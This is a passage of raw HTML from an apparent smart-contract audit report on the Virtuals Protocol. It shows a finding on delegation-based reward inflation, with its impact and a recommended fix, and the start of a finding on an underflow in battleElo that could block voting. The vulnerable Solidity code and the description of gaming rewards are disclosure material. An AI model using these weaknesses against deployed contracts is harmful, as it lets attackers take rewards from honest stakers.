\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaccount\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003evirtualId\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    ) \u003c/span\u003e\u003cspan class=\"mtk11\"\u003epublic\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eview\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003ereturns\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etotalClaimable\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003enumRewards\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eClaim\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ememory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eclaim\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_stakerClaims\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaccount\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e][\u003c/span\u003e\u003cspan class=\"mtk12\"\u003evirtualId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e];\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003enumRewards\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk10\"\u003eMath\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003emin\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eLOOP_LIMIT\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e + \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eclaim\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003erewardCount\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk11\"\u003egetAgentRewardCount\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003evirtualId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e));\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eIAgentVeToken\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eveToken\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eIAgentVeToken\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eIAgentNft\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eagentNft\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e).\u003c/span\u003e\u003cspan class=\"mtk11\"\u003evirtualLP\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003evirtualId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e).\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eveToken\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eIAgentDAO\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003edao\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eIAgentDAO\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eIAgentNft\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eagentNft\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e).\u003c/span\u003e\u003cspan class=\"mtk11\"\u003evirtualInfo\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003evirtualId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e).\u003c/span\u003e\u003cspan class=\"mtk12\"\u003edao\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk15\"\u003efor\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ei\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eclaim\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003erewardCount\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e; \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ei\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u0026lt; \u003c/span\u003e\u003cspan class=\"mtk12\"\u003enumRewards\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e; \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ei\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e++) {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eAgentReward\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ememory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eagentReward\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk11\"\u003egetAgentReward\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003evirtualId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ei\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eReward\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ememory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ereward\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk11\"\u003egetReward\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eagentReward\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003erewardIndex\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e@\u0026gt;          \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003edelegatee\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eveToken\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003egetPastDelegates\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaccount\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ereward\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eblockNumber\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euptime\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003edao\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003egetPastScore\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003edelegatee\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ereward\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eblockNumber\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003estakedAmount\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eveToken\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003egetPastBalanceOf\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaccount\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ereward\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eblockNumber\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003estakerReward\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eagentReward\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003estakerAmount\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e * \u003c/span\u003e\u003cspan class=\"mtk12\"\u003estakedAmount\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) / \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eagentReward\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003etotalStaked\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk12\"\u003estakerReward\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003estakerReward\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e * \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euptime\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) / \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eagentReward\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003etotalProposals\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etotalClaimable\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e += \u003c/span\u003e\u003cspan class=\"mtk12\"\u003estakerReward\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        }\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    }\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eAs a result, repeated delegation records combined with zeroed balances allow the delegatee to appear historically more active, and to receive inflated uptime-based rewards; even though the stake was not present at the time.\u003c/p\u003e\n\u003ch3 id=\"impact-14\" style=\"position:relative;\"\u003e\u003ca href=\"#impact-14\" aria-label=\"impact 14 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eImpact\u003c/h3\u003e\n\u003cul\u003e\n\u003cli\u003eReward distribution becomes exploitable by staking and undelegating rapidly after maturity.\u003c/li\u003e\n\u003cli\u003eDelegatees receive excessive rewards due to inflated uptime scores based on \u003ccode\u003egetPastDelegates()\u003c/code\u003e.\u003c/li\u003e\n\u003cli\u003eGovernance power and monetary reward flows become decoupled from actual stake and participation.\u003c/li\u003e\n\u003cli\u003eFairness of the protocol is compromised; malicious users can game the system at the expense of honest stakers and voters.\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch3 id=\"recommended-mitigation-steps-24\" style=\"position:relative;\"\u003e\u003ca href=\"#recommended-mitigation-steps-24\" aria-label=\"recommended mitigation steps 24 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eRecommended mitigation steps\u003c/h3\u003e\n\u003cp\u003eUpdate the \u003ccode\u003ewithdraw()\u003c/code\u003e function to automatically clear a user’s delegation when their token balance drops to zero. This prevents the retention of voting power or reward eligibility after the staker has exited.\u003c/p\u003e\n\u003chr\u003e\n\u003ch2 id=\"m-21-battleelo-is-at-risk-of-underflow-revert-which-may-dos-voting\" style=\"position:relative;\"\u003e\u003ca href=\"#m-21-battleelo-is-at-risk-of-underflow-revert-which-may-dos-voting\" aria-label=\"m 21 battleelo is at risk of underflow revert which may dos voting permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/F-165\"\u003e[M-21] \u003ccode\u003ebattleElo\u003c/code\u003e is at risk of underflow revert, which may DOS voting\u003c/a\u003e\u003c/h2\u003e\n\u003cp\u003e\u003cem\u003eSubmitted by \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-774\"\u003eoakcobalt\u003c/a\u003e, also found by \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-412\"\u003etestnate\u003c/a\u003e\u003c/em\u003e\u003c/p\u003e\n\u003cp\u003eIn EloCalculator.sol, the \u003ccode\u003ebattleElo()\u003c/code\u003e function calculates a new maturity score based on a series of battle results:\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"106\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003ebattleElo\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ecurrentRating\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint8\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[] \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ememory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ebattles\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) \u003c/span\u003e\u003cspan class=\"mtk11\"\u003epublic\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eview\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003ereturns\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eeloA\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e1000\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eeloB\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e1000\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk15\"\u003efor\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ei\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e; \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ei\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u0026lt; \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ebattles\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003elength\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e; \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ei\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e++) {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eresult\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk11\"\u003emapBattleResultToGameResult\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ebattles\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ei\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e]);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003echange\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ebool\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003enegative\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eElo\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eratingChange\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eeloB\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eeloA\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eresult\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ek\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003echange\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk11\"\u003e_roundUp\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003echange\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e100\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eif\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003enegative\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eeloA\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e -= \u003c/span\u003e\u003cspan class=\"mtk12\"\u003echange\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eeloB\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e += \u003c/span\u003e\u003cspan class=\"mtk12\"\u003echange\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        } \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eelse\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eeloA\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e += \u003c/span\u003e\u003cspan class=\"mtk12\"\u003echange\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan 